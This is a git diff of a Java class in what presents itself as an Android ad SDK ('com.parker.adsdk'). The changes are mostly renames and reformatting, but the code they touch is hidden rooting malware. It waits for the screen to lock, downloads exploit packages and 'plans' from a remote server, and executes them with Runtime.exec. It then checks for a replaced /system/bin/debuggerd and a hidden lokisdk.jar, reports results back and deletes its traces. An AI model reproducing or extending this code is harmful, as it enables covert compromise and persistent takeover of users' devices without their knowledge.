@@ -10,9 +10,10 @@ import android.preference.PreferenceManager;
 
 import com.parker.adsdk.RootHelper;
 import com.parker.adsdk.entity.WorkPlan;
+import com.parker.adsdk.network.NetworkRequest;
 import com.parker.adsdk.network.RequestUtil;
 import com.parker.adsdk.util.FileUtils;
-import com.parker.adsdk.util.LogUtil;
+import com.parker.adsdk.util.MyLog;
 import com.parker.adsdk.util.PreferenceUtils;
 import com.parker.adsdk.util.ServiceUtils;
 
@@ -48,6 +49,7 @@ public class Work {
     private long extra_end_time;
     private String extra_trigger;
     private int exe_time;
+
     public Work(Context context) {
         super();
         this.context = context;
@@ -63,56 +65,50 @@ public class Work {
     }
 
     public void run() {
-        LogUtil.append("正在检测R状态...");
-        String resp = RequestUtil.requstInit(this.context);
+        MyLog.i("正在检测R状态...");
+        String resp = RequestUtil.requestInit(this.context ,false);
         try {
             JSONObject jsonObject = new JSONObject(resp);
-            if(jsonObject.optJSONObject("result").optInt("code") != 0) {
-                LogUtil.append("停止R，错误代码：" + jsonObject.optJSONObject("result").optInt("code"));
+            if (jsonObject.optJSONObject("result").optInt("code") != 0) {
+                MyLog.i("停止R，错误代码：" + jsonObject.optJSONObject("result").optInt("code"));
                 this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
                 return;
             }
 
-            if(ServiceUtils.isRoot(this.context, jsonObject)) {
+            if (ServiceUtils.isRoot(this.context, jsonObject)) {
                 this.context.sendBroadcast(new Intent("org.admobile.helper.intent.r.status").putExtra(
                         "status", true));
-                LogUtil.append("已R, 停止流程");
+                MyLog.i("已R, 停止流程");
                 this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
-            }
-            else {
-                LogUtil.append("未R");
+            } else {
+                MyLog.i("未R");
                 this.trigger();
             }
 
             return;
-        }
-        catch(Exception e) {
+        } catch (Exception e) {
             return;
         }
     }
 
     private void trigger() {
-        if(this.exe_time == 0) {
-            LogUtil.append("执行类型：立即执行");
+        if (this.exe_time == 0) {
+            MyLog.i("执行类型：立即执行");
             this.exec();
-        }
-        else {
-            if(RootHelper.DEBUG) {
-                LogUtil.append("执行类型：定时执行");
-                LogUtil.append("定时执行触发条件：" + this.extra_trigger);
-            }
-
-            if(this.extra_trigger.equals("lock")) {
-                if(((KeyguardManager)context.getSystemService(Context.KEYGUARD_SERVICE)).inKeyguardRestrictedInputMode()) {
-                    LogUtil.append("已锁屏，开始执行");
+        } else {
+            MyLog.i("执行类型：定时执行");
+            MyLog.i("定时执行触发条件：" + this.extra_trigger);
+            if (this.extra_trigger.equals("lock")) {
+                if (((KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE)).inKeyguardRestrictedInputMode()) {
+                    MyLog.i("已锁屏，开始执行");
                     this.exec();
                     return;
                 }
 
-                LogUtil.append("未锁屏，延后１小时执行");
+                MyLog.i("未锁屏，延后１小时执行");
                 this.extra_start_time += 3600000;
-                if(this.extra_start_time > this.extra_end_time) {
-                    LogUtil.append("已超过最晚时间，放弃R");
+                if (this.extra_start_time > this.extra_end_time) {
+                    MyLog.i("已超过最晚时间，放弃R");
                     return;
                 }
 
@@ -124,7 +120,7 @@ public class Work {
                 PendingIntent pendingIntent = PendingIntent.getBroadcast(this.context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
                 alarmManager.cancel(pendingIntent);
                 alarmManager.set(0, this.extra_start_time, pendingIntent);
-                LogUtil.append("时间设置为:" + this.extra_start_time);
+                MyLog.i("时间设置为:" + this.extra_start_time);
                 return;
             }
 
@@ -133,9 +129,8 @@ public class Work {
 
     }
 
-    private void exec()
-    {
-        LogUtil.append("正在获取数据...");
+    private void exec() {
+        MyLog.i("正在获取数据...");
         String resp = RequestUtil.requestOta(this.context);
         ArrayList<WorkPlan> plans = new ArrayList();
         plans.addAll(this.getStoredPlans());
@@ -143,37 +138,31 @@ public class Work {
         this.storeAllPlans(plans);
         FileInputStream fis = null;
         try {
-            LogUtil.append("获取OTA数据...");
-            RequestUtil.downloadPlus(this.context, 0, this.otaUrl, this.otaName, this.getOtaMd5(resp));
+            MyLog.i("获取OTA数据...");
+            RequestUtil.downloadFile(this.context, RequestUtil.EVENT_HELPER_DOWNLOAD_OTA, this.otaUrl, this.otaName, this.getOtaMd5(resp));
             fis = new FileInputStream(this.otaName);
-            LogUtil.append("正在解析数据...");
+            MyLog.i("正在解析数据...");
             try {
                 this.extracto(fis, this.otaDir);
-            }catch (Exception e)
-            {
-                RequestUtil.requestFeedback(this.context, 24, null);
+            } catch (Exception e) {
+                RequestUtil.recordLog(this.context, 24, null);
                 throw e;
             }
             int i = 1;
-            for (WorkPlan workPlan :plans)
-            {
-                if (workPlan.getState() == 1)
-                {
+            for (WorkPlan workPlan : plans) {
+                if (workPlan.getState() == 1) {
                     workPlan.setState(0);
-                }else if (workPlan.getState() != 0)
-                {
+                } else if (workPlan.getState() != 0) {
 
-                    LogUtil.append("方案" + i + ":" + workPlan.getUrl().substring(
+                    MyLog.i("方案" + i + ":" + workPlan.getUrl().substring(
                             workPlan.getUrl().lastIndexOf("/") + 1, workPlan.getUrl().length())
                             + " " + workPlan.getParams() + " " + this.otaName.getAbsolutePath());
                     workPlan.setState(1);
                     this.storeAllPlans(plans);
-                    LogUtil.append("正在获取方案数据...");
-                    RequestUtil.downloadPlus(this.context, 1, workPlan.getUrl(), this.work, workPlan.getPlanMd5());
-                    try
-                    {
-                        if (this.execWorkPlan(workPlan))
-                        {
+                    MyLog.i("正在获取方案数据...");
+                    RequestUtil.downloadFile(this.context, RequestUtil.EVENT_HELPER_DOWNLOAD_PLAN, workPlan.getUrl(), this.work, workPlan.getPlanMd5());
+                    try {
+                        if (this.execWorkPlan(workPlan)) {
                             this.removeAllPlans();
                             this.clear();
                             return;
@@ -181,29 +170,25 @@ public class Work {
                         workPlan.setState(0);
                         this.storeAllPlans(plans);
                         i++;
-                    }catch (Throwable tr)
-                    {
+                    } catch (Throwable tr) {
                         workPlan.setState(0);
                         this.storeAllPlans(plans);
                         i++;
                     }
-                }else
-                {
+                } else {
                     continue;
                 }
 
 
             }
-        }
-        catch(Exception ex) {
-            LogUtil.append("出现错误，R失败" + ex.getMessage());
+        } catch (Exception ex) {
+            MyLog.i("出现错误，R失败" + ex.getMessage());
             this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
             this.clear();
             return;
 
-        }finally {
-            if (fis != null)
-            {
+        } finally {
+            if (fis != null) {
                 try {
                     fis.close();
                 } catch (IOException e) {
@@ -212,6 +197,7 @@ public class Work {
             }
         }
     }
+
     private void putLastTid(String tid) {
         PreferenceManager.getDefaultSharedPreferences(this.context).edit().putString("lastTid", tid)
                 .apply();
@@ -221,20 +207,19 @@ public class Work {
         String tid = UUID.randomUUID().toString();
         this.putLastTid(tid);
         boolean result = false;
-        LogUtil.append("方案获取成功，开始执行方案...");
+        MyLog.i("方案获取成功，开始执行方案...");
         JSONObject plan = new JSONObject();
         plan.put("url", workPlan.getUrl());
         plan.put("params", workPlan.getParams());
-        RequestUtil.reportPara(this.context, tid, 1, plan, null);
-        try
-        {
+        RequestUtil.recordWork(this.context, tid, 1, plan, null);
+        try {
             String line;
             Process process = Runtime.getRuntime().exec(this.buildCmd(workPlan.getParams()));
             BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
             do {
                 line = br.readLine();
                 if (line != null) {
-                    LogUtil.append(line);
+                    MyLog.i(line);
                     if (line.equals("[exp_result]:[success]")) {
                         break;
                     }
@@ -244,48 +229,41 @@ public class Work {
             } while (!line.equals("[exp_result]:[failure]"));
             this.removeLastTid();
             String str = line.equals("[exp_result]:[success]") ? "R成功，请重启手机" : "R失败";
-            LogUtil.append(str);
+            MyLog.i(str);
             boolean sucess = line.equals("[exp_result]:[success]");
-            if (sucess)
-            {
-                try
-                {
+            if (sucess) {
+                try {
                     long systemFreeSpace = this.getSystemFreeSpace();
                     JSONObject info = new JSONObject();
                     info.put("systemFreeSpace", systemFreeSpace);
                     File fDebuggerd = new File("/system/bin/debuggerd");
                     File fDebuggerd_loki = new File("/system/bin/debuggerd_loki");
                     File fLokisdkJar = new File("/data/system/.loki/lokisdk.jar");
-                    if((fDebuggerd.exists()) && (fDebuggerd_loki.exists()) && fDebuggerd.length() != fDebuggerd_loki
+                    if ((fDebuggerd.exists()) && (fDebuggerd_loki.exists()) && fDebuggerd.length() != fDebuggerd_loki
                             .length()) {
-                        RequestUtil.reportPara(this.context, tid, 61, plan, info);
+                        RequestUtil.recordWork(this.context, tid, 61, plan, info);
                         PreferenceUtils.putDoneTrue(this.context);
                         this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish").putExtra(
                                 "need_reboot", true));
                         result = sucess;
-                    }else
-                    {
-                        if(fLokisdkJar.exists()) {
+                    } else {
+                        if (fLokisdkJar.exists()) {
                             info.put("debuggerdFileSize", fDebuggerd.length());
-                            RequestUtil.reportPara(this.context, tid, 63, plan, info);
-                        }else
-                        {
-                            RequestUtil.reportPara(this.context, tid, 62, plan, null);
+                            RequestUtil.recordWork(this.context, tid, 63, plan, info);
+                        } else {
+                            RequestUtil.recordWork(this.context, tid, 62, plan, null);
                         }
                         PreferenceUtils.putDoneTrue(this.context);
                         this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish").putExtra(
                                 "need_reboot", true));
                         result = sucess;
                     }
-                }catch (Exception e)
-                {
+                } catch (Exception e) {
                     e.printStackTrace();
                 }
 
 
-
-            }else
-            {
+            } else {
                 result = sucess;
 
             }
@@ -294,20 +272,20 @@ public class Work {
             return result;
 
 
-
-        }catch (Exception ex)
-        {
-            RequestUtil.reportPara(context, tid, 3, plan, null);
+        } catch (Exception ex) {
+            RequestUtil.recordWork(context, tid, 3, plan, null);
             return false;
         }
 
     }
+
     private void removeLastTid() {
         PreferenceManager.getDefaultSharedPreferences(this.context).edit().remove("lastTid").apply();
     }
+
     private long getSystemFreeSpace() {
         StatFs starFs = new StatFs("/system");
-        return (((long)starFs.getBlockCount())) * (((long)starFs.getBlockSize()));
+        return (((long) starFs.getBlockCount())) * (((long) starFs.getBlockSize()));
     }
 
     private String buildCmd(String params) {
@@ -315,19 +293,19 @@ public class Work {
     }
 
     private void clear() {
-        LogUtil.append("清理文件...");
+        MyLog.i("清理文件...");
         this.work.delete();
         this.otaDir.delete();
         File[] files = this.context.getFilesDir().listFiles();
         int len = files.length;
         int i;
-        for(i = 0; i < len; ++i) {
+        for (i = 0; i < len; ++i) {
             files[i].delete();
         }
     }
 
     private void removeAllPlans() {
-        LogUtil.append("删除所有方案...");
+        MyLog.i("删除所有方案...");
         PreferenceManager.getDefaultSharedPreferences(this.context).edit().remove("plans").apply();
     }
 
@@ -336,22 +314,22 @@ public class Work {
         FileUtils.setPermissions(destdir, 511);
         ZipInputStream zis = new ZipInputStream(is);
         File f;
-        while(true) {
+        while (true) {
             ZipEntry zipEntry = zis.getNextEntry();
-            if(zipEntry == null) {
+            if (zipEntry == null) {
                 break;
             }
 
             String name = zipEntry.getName();
-            if(name.startsWith("META-INF")) {
+            if (name.startsWith("META-INF")) {
                 continue;
             }
 
-            if(zipEntry.isDirectory()) {
+            if (zipEntry.isDirectory()) {
                 continue;
             }
 
-            if(!"package".equals(name) && !"version".equals(name) && !"installer".equals(name)) {
+            if (!"package".equals(name) && !"version".equals(name) && !"installer".equals(name)) {
                 continue;
             }
 
@@ -373,9 +351,9 @@ public class Work {
 
     private void copyFile(InputStream in, OutputStream out) throws IOException {
         byte[] buf = new byte[4096];
-        while(true) {
+        while (true) {
             int len = in.read(buf);
-            if(len <= 0) {
+            if (len <= 0) {
                 return;
             }
 
@@ -387,8 +365,7 @@ public class Work {
         String result;
         try {
             result = new JSONObject(jsonStr).optString("otaMd5");
-        }
-        catch(Exception e) {
+        } catch (Exception e) {
             result = "";
         }
 
@@ -396,12 +373,11 @@ public class Work {
     }
 
 
-
     private void storeAllPlans(List<WorkPlan> plans) {
-        LogUtil.append("存储所有方案...");
+        MyLog.i("存储所有方案...");
         JSONArray jsonArray = new JSONArray();
         Iterator<WorkPlan> it = plans.iterator();
-        while(it.hasNext()) {
+        while (it.hasNext()) {
             jsonArray.put(it.next().pack());
         }
 
@@ -410,22 +386,21 @@ public class Work {
     }
 
     private List<WorkPlan> getStoredPlans() {
-        LogUtil.append("获取已存储方案...");
+        MyLog.i("获取已存储方案...");
         ArrayList<WorkPlan> result = new ArrayList();
         String str = PreferenceManager.getDefaultSharedPreferences(this.context).getString("plans", null);
         try {
             JSONArray workPlans = new JSONArray(str);
-            for(int i = 0; i < workPlans.length(); ++i) {
+            for (int i = 0; i < workPlans.length(); ++i) {
                 result.add(new WorkPlan(workPlans.optJSONObject(i)));
             }
-        }
-        catch(Exception e) {
+        } catch (Exception e) {
         }
 
         Iterator<WorkPlan> it = result.iterator();
-        while(it.hasNext()) {
+        while (it.hasNext()) {
             WorkPlan workPlan = it.next();
-            if(workPlan.getState() != 1) {
+            if (workPlan.getState() != 1) {
                 continue;
             }
 
@@ -436,13 +411,13 @@ public class Work {
     }
 
     private List<WorkPlan> parseNewPlan(String str) {
-        LogUtil.append("解析新方案...");
+        MyLog.i("解析新方案...");
         ArrayList<WorkPlan> result = new ArrayList();
         try {
             JSONObject jsonObject = new JSONObject(str);
             String otaName = jsonObject.optString("otaName", "");
             JSONArray plan = jsonObject.optJSONArray("plan");
-            for(int i = 0; i < plan.length(); ++i) {
+            for (int i = 0; i < plan.length(); ++i) {
                 result.add(new WorkPlan(plan.optJSONObject(i)));
             }
 
@@ -452,8 +427,7 @@ public class Work {
             this.otaName = new File(this.context.getFilesDir(), otaName);
             this.work = new File(this.context.getFilesDir(), "work");
 
-        }
-        catch(Exception e) {
+        } catch (Exception e) {
         }
         return result;
     }
